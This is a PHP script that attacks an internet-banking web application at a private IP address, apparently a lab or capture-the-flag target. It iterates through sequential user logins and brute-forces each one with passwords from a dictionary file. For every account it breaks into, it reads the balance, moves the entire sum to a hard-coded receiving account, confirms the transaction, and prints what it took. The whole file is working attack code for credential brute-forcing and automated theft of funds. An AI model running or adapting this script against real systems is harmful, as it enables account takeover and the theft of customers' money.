<?php

$login       = '100001';
$account     = '90107430600227300001';
$domain      = '10.1.76.100';
$cookie_file = '/tmp/ibank_cookie';

function login($ch, $login, $password, $domain)
{
    $postdata = http_build_query(
            array(
                'login'    => $login,
                'password' => $password,
            )
    );

    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/login',
        CURLOPT_POST           => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POSTFIELDS     => $postdata,
    ));

    return curl_exec($ch);
}

function logout($ch, $domain)
{
    curl_setopt_array($ch, array(
        CURLOPT_URL            => $domain . '/auth/logout',
        CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_POST           => 0,
    ));

    return curl_exec($ch);
}

@unlink($cookie_file);
file_put_contents($cookie_file, "$domain\tFALSE\t/\tFALSE\t0\tmobileInterface\ttrue", FILE_APPEND | LOCK_EX);

$ch = curl_init();

curl_setopt_array($ch, array(
    CURLOPT_HEADER         => 0,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEJAR      => $cookie_file,
    CURLOPT_COOKIEFILE     => $cookie_file,
));

$passwords = array_map('rtrim', file('passwords.dict'));

while (1) {
    $found = false;
    foreach ($passwords as $password) {
        $result = login($ch, $login, $password, $domain);
        if (strpos($result, 'Wrong password'))
            continue;

        if (strpos($result, 'User not found'))
            exit;

        $found = true;
        break;
    }

    if ($found) {
        $id = $login - 100000;
        
        curl_setopt_array($ch, array(
            CURLOPT_URL  => $domain . '/transactions/create',
            CURLOPT_POST => 0,
        ));

        $result = curl_exec($ch);

        if (!preg_match("~<option\s*value=\"(\d+)\">.*\(([0-9,\.]+)\s*RUB\)~msU", $result, $match))
            continue;

        $sum = $match[2];

        if ($sum < 1)
            continue;

        curl_setopt_array($ch, array(
            CURLOPT_URL            => $domain . '/transactions/create',
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_POST           => 1,
            CURLOPT_POSTFIELDS     => http_build_query(array(
                'from' => $match[1],
                'to'   => $account,
                'sum'  => $sum
            )),
        ));

        $result = curl_exec($ch);

        preg_match("~/transactions/delete/id/(\d+)~", $result, $match);
        $transaction_id = $match[1];

        curl_setopt_array($ch, array(
            CURLOPT_URL            => $domain . '/transactions/process/id/' . $transaction_id,
            CURLOPT_FOLLOWLOCATION => 0,
            CURLOPT_POST           => 0,
        ));

        echo "From $id sum $sum\n";

        $result = curl_exec($ch);
    }

    $login++;

    logout($ch, $domain);
}